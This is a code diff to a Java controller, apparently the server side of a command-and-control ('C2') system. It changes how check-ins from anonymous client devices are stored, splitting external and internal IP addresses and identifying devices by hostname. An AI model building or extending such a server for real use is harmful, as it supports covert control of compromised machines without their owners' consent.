@@ -75,7 +75,9 @@ public class C2Controller {
     
     // Helper to record heartbeat from request
     private C2Device recordHeartbeat(Map<String, Object> payload, HttpServletRequest request) {
-        String ip = NetUtils.getIpAddress(request);
+        // External IP from request header/remote addr
+        String externalIp = NetUtils.getIpAddress(request);
+        String internalIp = "Unknown";
         String hostName = "Unknown";
         String os = "Unknown";
         
@@ -86,43 +88,50 @@ public class C2Controller {
             if (payload.containsKey("os")) {
                 os = (String) payload.get("os");
             }
-            // Use client reported IP if provided and request IP is localhost/IPv6 loopback
+            // Client reported IP is treated as Internal IP
              if (payload.containsKey("ip")) {
                 String clientIp = (String) payload.get("ip");
                 if (clientIp != null && !clientIp.isEmpty()) {
-                    if ("127.0.0.1".equals(ip) || "0:0:0:0:0:0:0:1".equals(ip) || "localhost".equals(ip)) {
-                         // Prefer first IPv4 if multiple
-                         String[] ips = clientIp.split(",");
-                         for (String i : ips) {
-                             i = i.trim();
-                             if (!i.isEmpty() && i.contains(".") && !i.contains(":")) {
-                                 ip = i;
-                                 break;
-                             }
-                         }
-                         // If no IPv4 found, just use the whole string or first one
-                         if ("127.0.0.1".equals(ip) || "0:0:0:0:0:0:0:1".equals(ip)) {
-                             ip = ips[0].trim();
-                         }
-                    }
+                    internalIp = clientIp;
                 }
              }
         }
 
-        // Simple identification by IP for now since client is anonymous
+        // Identify by External IP + Hostname to distinguish devices behind NAT if possible, 
+        // or just rely on Internal IP if available? 
+        // For simplicity, let's query by Hostname if available, else External IP.
+        // Better: Use a combination or generated UUID in client in future.
+        // Current logic: Query by hostName if present and not Unknown, else External IP.
+        
         QueryWrapper<C2Device> queryWrapper = new QueryWrapper<>();
-        queryWrapper.eq("ip", ip);
-        C2Device device = c2DeviceMapper.selectOne(queryWrapper);
+        if (!"Unknown".equals(hostName)) {
+            queryWrapper.eq("hostName", hostName);
+        } else {
+            queryWrapper.eq("externalIp", externalIp);
+        }
+        
+        // Handle potential duplicates or just pick one
+        List<C2Device> devices = c2DeviceMapper.selectList(queryWrapper);
+        C2Device device = null;
+        if (devices != null && !devices.isEmpty()) {
+            device = devices.get(0);
+        }
+
         if (device == null) {
             device = new C2Device();
-            device.setIp(ip);
+            device.setExternalIp(externalIp);
+            device.setInternalIp(internalIp);
             device.setHostName(hostName);
             device.setOs(os);
             device.setLastSeen(new Date());
             c2DeviceMapper.insert(device);
         } else {
             device.setLastSeen(new Date());
-            // Update info if it was unknown before or changed
+            // Update info
+            device.setExternalIp(externalIp);
+            if (!"Unknown".equals(internalIp)) {
+                device.setInternalIp(internalIp);
+            }
             if (!"Unknown".equals(hostName)) {
                 device.setHostName(hostName);
             }
